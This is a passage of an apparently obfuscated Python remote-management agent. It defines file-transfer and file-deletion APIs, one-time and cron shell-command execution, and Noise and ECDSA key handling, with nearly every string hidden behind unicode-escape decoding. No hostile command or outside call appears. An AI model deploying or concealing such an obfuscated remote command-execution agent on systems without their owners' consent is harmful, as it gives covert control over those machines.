    codecs.decode('\\u88f8\\u4e8c\\u8fdb\\u5236\\u6d41\\u4e0a\\u4f20\\u63a5\\u53e3\\u7684\\u6807\\u51c6\\u5316\\u7ed3\\u6784\\u4f53\\u8fd4\\u56de\\u4f53', 'unicode_escape')
    path: Optional[str] = Field(None, description=codecs.decode('\\u6587\\u4ef6\\u5728\\u670d\\u52a1\\u5668\\u7aef\\u7684\\u4fdd\\u5b58\\u8def\\u5f84', 'unicode_escape'))
    chunk_id: Optional[int] = Field(None, description=codecs.decode('\\u5f53\\u524d\\u4e0a\\u4f20\\u7684\\u5206\\u7247\\u7d22\\u5f15', 'unicode_escape'))
    completed: bool = Field(..., description=codecs.decode('\\u6307\\u793a\\u8be5\\u6587\\u4ef6\\u662f\\u5426\\u5df2\\u5168\\u90e8\\u4f20\\u8f93\\u5e76\\u5408\\u5e76\\u5b8c\\u6210', 'unicode_escape'))
    message: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u72b6\\u6001\\u63d0\\u793a\\u6d88\\u606f', 'unicode_escape'))

class FileUploadResponse(SResponse):
    path: Optional[str] = None
    received: Optional[int] = None
    total: Optional[int] = None
    chunked: Optional[bool] = None

class FileDownloadRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u4e0b\\u8f7d\\u7684\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002e\\u0074\\u0061\\u0072\\u002e\\u0067\\u007a', 'unicode_escape')])

class FileDeleteRequest(BaseModel):
    paths: List[str] = Field(..., description=codecs.decode('\\u8981\\u5220\\u9664\\u7684\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u8def\\u5f84\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u006c\\u006f\\u0067', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0063\\u0061\\u0063\\u0068\\u0065', 'unicode_escape')]])
    path: Optional[str] = Field(None, exclude=True)
    path2: Optional[str] = Field(None, exclude=True)

class FileDeleteResult(BaseModel):
    path: str
    status: str

class FileDeleteResponse(BaseModel):
    status: str
    results: List[FileDeleteResult]

class FileMoveRequest(BaseModel):
    move_map: Dict[str, str] = Field(..., description=codecs.decode('\\u6e90\\u8def\\u5f84\\u5230\\u76ee\\u6807\\u8def\\u5f84\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')}])
    path: Optional[str] = Field(None, exclude=True)
    mvpath: Optional[str] = Field(None, exclude=True)

class FileMoveResult(BaseModel):
    from_field: str = Field(..., alias=codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'))
    to: str
    status: str
    model_config = ConfigDict(populate_by_name=True)

class FileMoveResponse(BaseModel):
    status: str
    total: int
    success: int
    results: List[Dict[str, str]]

class FileMkdirRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u521b\\u5efa\\u7684\\u65b0\\u76ee\\u5f55\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006e\\u0065\\u0077\\u002f\\u0070\\u0072\\u006f\\u006a\\u0065\\u0063\\u0074\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')])

class FileMkdirResponse(BaseModel):
    status: str
    path: str

class OneTimeTaskGetResponse(BaseModel):
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), description=codecs.decode('\\u8bf7\\u6c42\\u72b6\\u6001', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    count: int = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u4efb\\u52a1\\u7684\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    tasks: List[str] = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u7684\\u4efb\\u52a1\\u547d\\u4ee4\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u0065\\u0063\\u0068\\u006f\\u0020\\u0027\\u0069\\u006e\\u0069\\u0074\\u0027', 'unicode_escape'), codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0073\\u0065\\u0074\\u0075\\u0070\\u002e\\u0073\\u0068', 'unicode_escape')]])

class OneTimeTaskRequest(RootModel):
    root: List[str]

class OneTimeTaskResponse(CountResponse):
    tasks: List[str]
    executed: Optional[List[Any]] = None

class CronTasksResponse(CountResponse):
    tasks: Dict[str, str] = Field(..., description=codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u8868\\u8fbe\\u5f0f\\u4e0e\\u547d\\u4ee4\\u7684\\u6620\\u5c04\\u5b57\\u5178', 'unicode_escape'), examples=[{codecs.decode('\\u002a\\u002f\\u0031\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape'): codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068\\u005f\\u0063\\u0068\\u0065\\u0063\\u006b\\u002e\\u0070\\u0079', 'unicode_escape')}])

class BaseLogEntry(BaseModel):
    ts: str = Field(..., description=codecs.decode('\\u6267\\u884c\\u65f6\\u95f4\\u6233', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0034\\u002d\\u0030\\u0031\\u002d\\u0031\\u0035\\u0054\\u0031\\u0030\\u003a\\u0033\\u0030\\u003a\\u0034\\u0035\\u005a', 'unicode_escape')])
    cmd: str = Field(..., description=codecs.decode('\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'))
    output: str = Field(..., description=codecs.decode('\\u547d\\u4ee4\\u8f93\\u51fa\\u5185\\u5bb9', 'unicode_escape'))
    exitcode: int = Field(..., description=codecs.decode('\\u9000\\u51fa\\u7801', 'unicode_escape'))
    type: str = Field(..., description=codecs.decode('\\u65e5\\u5fd7\\u7c7b\\u578b', 'unicode_escape'))
    formatted: Optional[str] = Field(None, description=codecs.decode('\\u683c\\u5f0f\\u5316\\u540e\\u7684\\u6458\\u8981', 'unicode_escape'))

class CronLogEntry(BaseLogEntry):
    cron: str = Field(..., description=codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u8868\\u8fbe\\u5f0f', 'unicode_escape'), examples=[codecs.decode('\\u002a\\u002f\\u0035\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape')])

class TaskLogResponse(CountResponse):
    logs: List[Any]

class LogClearResponse(SResponse):
    cleared: str = Field(..., description=codecs.decode('\\u88ab\\u6e05\\u7a7a\\u7684\\u65e5\\u5fd7\\u7c7b\\u578b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape')])

class LogStats(BaseModel):
    total_logged: int
    max_capacity: int
    recent_success: int
    recent_failed: int

class LogSummaryResponse(BaseModel):
    onetime: LogStats
    cron: LogStats

class OnetimeStatus(BaseModel):
    pending: bool = Field(..., description=codecs.decode('\\u662f\\u5426\\u6709\\u5f85\\u6267\\u884c\\u7684\\u4efb\\u52a1', 'unicode_escape'), examples=[False])
    count: int = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[3])

class CronStatus(BaseModel):
    active: bool = Field(..., description=codecs.decode('\\u5b9a\\u65f6\\u4efb\\u52a1\\u8c03\\u5ea6\\u5668\\u662f\\u5426\\u5904\\u4e8e\\u6d3b\\u8dc3\\u72b6\\u6001', 'unicode_escape'), examples=[True])
    count: int = Field(..., description=codecs.decode('\\u5f53\\u524d\\u914d\\u7f6e\\u7684\\u5b9a\\u65f6\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    check_interval: int = Field(..., description=codecs.decode('\\u68c0\\u67e5\\u95f4\\u9694\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[30])

class TaskStatusResponse(BaseModel):
    onetime: OnetimeStatus
    cron: CronStatus

class OnetimeExecuteResponse(BaseModel):
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    message: Optional[str] = Field(None, description=codecs.decode('\\u72b6\\u6001\\u8bf4\\u660e', 'unicode_escape'))
    executed: int = Field(..., description=codecs.decode('\\u6210\\u529f\\u89e6\\u53d1\\u7684\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    results: List[Dict[str, Any]] = Field(..., description=codecs.decode('\\u6bcf\\u4e2a\\u4efb\\u52a1\\u7684\\u8be6\\u7ec6\\u6267\\u884c\\u7ed3\\u679c', 'unicode_escape'), examples=[[{codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): codecs.decode('\\u0065\\u0063\\u0068\\u006f\\u0020\\u0027\\u0068\\u0065\\u006c\\u006c\\u006f\\u0027', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074', 'unicode_escape'): codecs.decode('\\u0068\\u0065\\u006c\\u006c\\u006f\\u000a', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072', 'unicode_escape'): codecs.decode('', 'unicode_escape')}]])
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def _get_config_value(key: str, default: str=codecs.decode('', 'unicode_escape'), file_path: str=None) -> str:
    O0_var_27 = os.getenv(key)
    if O0_var_27 is not None:
        return O0_var_27.strip()
    if file_path:
        O0_var_28 = os.path.join(_BASE_DIR, file_path)
        if os.path.exists(O0_var_28):
            try:
                with open(O0_var_28, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_29:
                    O0_var_30 = O0_var_29.read().strip()
                    if O0_var_30:
                        return O0_var_30
            except Exception:
                pass
    return default.strip() if default else codecs.decode('', 'unicode_escape')

@dataclass
class NoiseKeypair:
    codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u534f\\u8bae\\u5bc6\\u94a5\\u5bf9\\u6570\\u636e\\u7c7b', 'unicode_escape')
    role: str
    private_b64: str
    public_b64: str

    def to_dict(self) -> Dict[str, str]:
        return asdict(self)

    @property
    def private_bytes(self) -> bytes:
        return base64.b64decode(self.private_b64)

    @property
    def public_bytes(self) -> bytes:
        return base64.b64decode(self.public_b64)

class NoiseKeyGenerator:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u0058\\u0032\\u0035\\u0035\\u0031\\u0039\\u0020\\u5bc6\\u94a5\\u5bf9\\u751f\\u6210\\u5668\\u000a\\u0020\\u0020\\u0020\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u751f\\u6210\\u7b26\\u5408\\u0020\\u006e\\u006f\\u0069\\u0073\\u0065\\u002d\\u0063\\u0020\\u002f\\u0020\\u006e\\u006f\\u0069\\u0073\\u0065\\u0070\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u6807\\u51c6\\u7684\\u0020\\u0033\\u0032\\u0020\\u5b57\\u8282\\u0020\\u0052\\u0061\\u0077\\u0020\\u683c\\u5f0f\\u5bc6\\u94a5\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    KEY_SIZE = 32
    ENCODING = serialization.Encoding.Raw
    PRIVATE_FORMAT = serialization.PrivateFormat.Raw
    PUBLIC_FORMAT = serialization.PublicFormat.Raw

    @staticmethod
    def _generate_raw_keypair() -> Tuple[bytes, bytes]:
        O0_var_31 = x25519.X25519PrivateKey.generate()
        O0_var_32 = O0_var_31.public_key()
        O0_var_33 = O0_var_31.private_bytes(encoding=NoiseKeyGenerator.ENCODING, format=NoiseKeyGenerator.PRIVATE_FORMAT, encryption_algorithm=serialization.NoEncryption())
        O0_var_34 = O0_var_32.public_bytes(encoding=NoiseKeyGenerator.ENCODING, format=NoiseKeyGenerator.PUBLIC_FORMAT)
        assert len(O0_var_33) == NoiseKeyGenerator.KEY_SIZE
        assert len(O0_var_34) == NoiseKeyGenerator.KEY_SIZE
        return (O0_var_33, O0_var_34)

    @classmethod
    def generate_single(cls, role_name: str) -> NoiseKeypair:
        O0_var_35, O0_var_36 = cls._generate_raw_keypair()
        return NoiseKeypair(role=role_name, private_b64=base64.b64encode(O0_var_35).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')), public_b64=base64.b64encode(O0_var_36).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))

    @classmethod
    def generate_pair(cls, control_role: str=codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape'), agent_role: str=codecs.decode('\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')) -> Dict[str, NoiseKeypair]:
        return {codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape'): cls.generate_single(control_role), codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): cls.generate_single(agent_role)}

class Config:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u914d\\u7f6e\\u4e2d\\u5fc3\\u0020\\u002d\\u0020\\u652f\\u6301\\u591a\\u7ea7\\u914d\\u7f6e\\u6e90\\u000a\\u0020\\u0020\\u0020\\u0020\\u4f18\\u5148\\u7ea7\\u003a\\u0020\\u73af\\u5883\\u53d8\\u91cf\\u0020\\u003e\\u0020\\u672c\\u5730\\u6587\\u4ef6\\u0020\\u003e\\u0020\\u9ed8\\u8ba4\\u503c\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    Rtimeout = int(os.getenv(codecs.decode('\\u0045\\u0058\\u0045\\u0043\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0033\\u0030', 'unicode_escape')))
    EXEC_SHELL_MODE = os.getenv(codecs.decode('\\u0045\\u0058\\u0045\\u0043\\u005f\\u0053\\u0048\\u0045\\u004c\\u004c', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    DEBUG = os.getenv(codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    TIMESTAMP_WINDOW = int(os.getenv(codecs.decode('\\u0054\\u0049\\u004d\\u0045\\u0053\\u0054\\u0041\\u004d\\u0050\\u005f\\u0057\\u0049\\u004e\\u0044\\u004f\\u0057', 'unicode_escape'), codecs.decode('\\u0033\\u0036\\u0030\\u0030', 'unicode_escape')))
    ECDSA_PUBLIC_KEY_PEM = _get_config_value(key=codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059', 'unicode_escape'), file_path=codecs.decode('\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u002e\\u0070\\u0065\\u006d', 'unicode_escape')) or codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u516c\\u94a5\\u5185\\u5bb9', 'unicode_escape')
    ECIES_PUBLIC_KEY_PEM = _get_config_value(key=codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059', 'unicode_escape'), file_path=codecs.decode('\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u002e\\u0062\\u0036\\u0034', 'unicode_escape')) or codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u516c\\u94a5\\u5185\\u5bb9', 'unicode_escape')
    _raw_key = get_random_bytes(32)
    SESSION_KEY = base64.b64encode(_raw_key).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
    keys = NoiseKeyGenerator.generate_pair()
    NOISE_KEY = {codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape'): {codecs.decode('\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065', 'unicode_escape'): keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].private_b64}, codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): {codecs.decode('\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063', 'unicode_escape'): keys[codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')].public_b64}}
    FILE_ROOT = _resolve_safe_file_root()
    MAX_UPLOAD_SIZE = int(os.getenv(codecs.decode('\\u004d\\u0041\\u0058\\u005f\\u0055\\u0050\\u004c\\u004f\\u0041\\u0044\\u005f\\u0053\\u0049\\u005a\\u0045', 'unicode_escape'), codecs.decode('\\u0031\\u0030\\u0034\\u0038\\u0035\\u0037\\u0036\\u0030\\u0030', 'unicode_escape')))
    FOLLOW_SYMLINKS = os.getenv(codecs.decode('\\u0046\\u004f\\u004c\\u004c\\u004f\\u0057\\u005f\\u0053\\u0059\\u004d\\u004c\\u0049\\u004e\\u004b\\u0053', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    FILE_AUDIT_LOG = os.getenv(codecs.decode('\\u0046\\u0049\\u004c\\u0045\\u005f\\u0041\\u0055\\u0044\\u0049\\u0054\\u005f\\u004c\\u004f\\u0047', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    InitTask: bool = True
    onetasks: List[str] = []
    crontasks: Dict[str, str] = {}
    cronloop: bool = False
    TASK_TIMEOUT = int(os.getenv(codecs.decode('\\u0054\\u0041\\u0053\\u004b\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0033\\u0030\\u0030', 'unicode_escape')))
    CRON_CHECK_INTERVAL = int(os.getenv(codecs.decode('\\u0043\\u0052\\u004f\\u004e\\u005f\\u0049\\u004e\\u0054\\u0045\\u0052\\u0056\\u0041\\u004c', 'unicode_escape'), codecs.decode('\\u0033\\u0030', 'unicode_escape')))
    onetimetasks_log: List[Dict[str, Any]] = []
    crontasks_log: List[Dict[str, Any]] = []
    MAX_TASK_LOG_SIZE = int(os.getenv(codecs.decode('\\u004d\\u0041\\u0058\\u005f\\u0054\\u0041\\u0053\\u004b\\u005f\\u004c\\u004f\\u0047', 'unicode_escape'), codecs.decode('\\u0031\\u0030\\u0030', 'unicode_escape')))
    TEMPKEY_DEFAULT_TTL_HOURS = int(os.getenv(codecs.decode('\\u0054\\u0045\\u004d\\u0050\\u004b\\u0045\\u0059\\u005f\\u0054\\u0054\\u004c', 'unicode_escape'), codecs.decode('\\u0032\\u0034', 'unicode_escape')))
    TEMPKEY_MAX_TTL_HOURS = int(os.getenv(codecs.decode('\\u0054\\u0045\\u004d\\u0050\\u004b\\u0045\\u0059\\u005f\\u004d\\u0041\\u0058\\u005f\\u0054\\u0054\\u004c', 'unicode_escape'), codecs.decode('\\u0031\\u0036\\u0038', 'unicode_escape')))
    BASEINFO_CACHE_TTL = 3600
    STATUS_CACHE_TTL = 30
    _baseinfo_cache: Optional[Dict[str, Any]] = None
    _baseinfo_cache_time: float = 0.0
    _baseinfo_lock: Optional[asyncio.Lock] = None
    _status_cache: Optional[Dict[str, Any]] = None
    _status_cache_time: float = 0.0
    _status_lock: Optional[asyncio.Lock] = None
    HOST = os.getenv(codecs.decode('\\u0048\\u004f\\u0053\\u0054', 'unicode_escape'), codecs.decode('\\u0030\\u002e\\u0030\\u002e\\u0030\\u002e\\u0030', 'unicode_escape'))
    PORT = int(os.getenv(codecs.decode('\\u004b\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or os.getenv(codecs.decode('\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or os.environ.get(codecs.decode('\\u0053\\u0045\\u0052\\u0056\\u0045\\u0052\\u005f\\u0050\\u004f\\u0052\\u0054', 'unicode_escape')) or 8000)
    AGENT_VERSION = os.getenv(codecs.decode('\\u0041\\u0047\\u0045\\u004e\\u0054\\u005f\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e', 'unicode_escape'), codecs.decode('\\u0030\\u002e\\u0034\\u002e\\u0037\\u002d\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e', 'unicode_escape'))

    @classmethod
    def validate(cls):
        if not cls.DEBUG:
            O0_var_37 = []
            if not cls.ECDSA_PUBLIC_KEY_PEM:
                O0_var_37.append(codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003a\\u0020\\u672a\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u4e14\\u6587\\u4ef6\\u0020\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u002e\\u0070\\u0065\\u006d\\u0020\\u4e0d\\u5b58\\u5728', 'unicode_escape'))
            else:
                try:
                    CryptoManager._load_ecdsa_pubkey(cls.ECDSA_PUBLIC_KEY_PEM)
                except Exception as e:
                    O0_var_37.append(codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u0020\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
            if not cls.ECIES_PUBLIC_KEY_PEM:
                O0_var_37.append(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003a\\u0020\\u672a\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u4e14\\u6587\\u4ef6\\u0020\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u002e\\u0062\\u0036\\u0034\\u0020\\u4e0d\\u5b58\\u5728', 'unicode_escape'))
            else:
                try:
                    CryptoManager.validate_ecies_pubkey(cls.ECIES_PUBLIC_KEY_PEM)
                except Exception as e:
                    O0_var_37.append(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u0020\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
            if O0_var_37:
                Logger.error(codecs.decode('\\u274c\\u0020\\u914d\\u7f6e\\u6821\\u9a8c\\u5931\\u8d25\\u0020\\u0028\\u975e\\u0044\\u0045\\u0042\\u0055\\u0047\\u6a21\\u5f0f\\u5fc5\\u987b\\u914d\\u7f6e\\u5bc6\\u94a5\\u0029\\u003a', 'unicode_escape'))
                for O0_var_38 in O0_var_37:
                    Logger.error(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020', 'unicode_escape') + str(O0_var_38))
                Logger.info(codecs.decode('\\u000a\\U0001f4a1\\u0020\\u89e3\\u51b3\\u65b9\\u6cd5\\u003a', 'unicode_escape'))
                Logger.info(codecs.decode('\\u0020\\u0020\\u0020\\u0031\\u002e\\u0020\\u8bbe\\u7f6e\\u73af\\u5883\\u53d8\\u91cf\\u003a\\u0020\\u0065\\u0078\\u0070\\u006f\\u0072\\u0074\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059\\u003d\\u0027\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e\\u0027', 'unicode_escape'))
                Logger.info(codecs.decode('\\u0020\\u0020\\u0020\\u0032\\u002e\\u0020\\u6216\\u5c06\\u5bc6\\u94a5\\u6587\\u4ef6\\u653e\\u5165\\u0020\\u002e\\u002f\\u006b\\u0065\\u0079\\u0073\\u002f\\u0020\\u76ee\\u5f55\\u0020\\u0028\\u8fd0\\u884c\\u0020\\u0067\\u0065\\u006e\\u0065\\u0072\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079\\u0073\\u002e\\u0070\\u0079\\u0020\\u751f\\u6210\\u0029', 'unicode_escape'))
                sys.exit(1)

class Logger:
    codecs.decode('\\u65e5\\u5fd7\\u5904\\u7406\\u5668', 'unicode_escape')
    if Config.DEBUG:
        _log_level = 1
    else:
        _log_level = 0

    @classmethod
    def set_log_level(cls, level: int):
        cls._log_level = level

    @classmethod
    def _log(cls, message: str, level: str=codecs.decode('\\u0049\\u004e\\u0046\\u004f', 'unicode_escape')):
        if cls._log_level == 0 and level != codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'):
            return
        O0_var_39 = datetime.now().strftime(codecs.decode('\\u0025\\u0059\\u002d\\u0025\\u006d\\u002d\\u0025\\u0064\\u0020\\u0025\\u0048\\u003a\\u0025\\u004d\\u003a\\u0025\\u0053', 'unicode_escape'))
        O0_var_40 = codecs.decode('\\u005b', 'unicode_escape') + str(O0_var_39) + codecs.decode('\\u005d\\u0020\\u005b', 'unicode_escape') + str(level) + codecs.decode('\\u005d\\u0020', 'unicode_escape') + str(message)
        if level == codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'):
            print(O0_var_40, file=sys.stderr)
        else:
            print(O0_var_40)

    @classmethod
    def debug(cls, message: str, debug_level: int=1):
        if cls._log_level == debug_level:
            cls._log(message, codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'))

    @classmethod
    def info(cls, message: str):
        cls._log(message, codecs.decode('\\u0049\\u004e\\u0046\\u004f', 'unicode_escape'))

    @classmethod
    def warning(cls, message: str):
        cls._log(message, codecs.decode('\\u0057\\u0041\\u0052\\u004e\\u0049\\u004e\\u0047', 'unicode_escape'))

    @classmethod
    def error(cls, message: str):
        cls._log(message, codecs.decode('\\u0045\\u0052\\u0052\\u004f\\u0052', 'unicode_escape'))

class CryptoManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u52a0\\u5bc6\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u4ee3\\u7406\\u7aef\\u4e13\\u7528\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u53ea\\u6301\\u6709\\u516c\\u94a5\\uff0c\\u4e0d\\u5b58\\u50a8\\u4efb\\u4f55\\u79c1\\u94a5\\u002f\\u654f\\u611f\\u4fe1\\u606f\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u63d0\\u4f9b\\u7b7e\\u540d\\u9a8c\\u8bc1\\u548c\\u54cd\\u5e94\\u52a0\\u5bc6\\u80fd\\u529b\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, O0_var_41: str, O0_var_42: str):
        self.ecdsa_vk = self._load_ecdsa_pubkey(O0_var_41)
        self.ecies_pubkey = None
        if O0_var_42 and O0_var_42.strip():
            O0_var_43 = O0_var_42.strip()
            try:
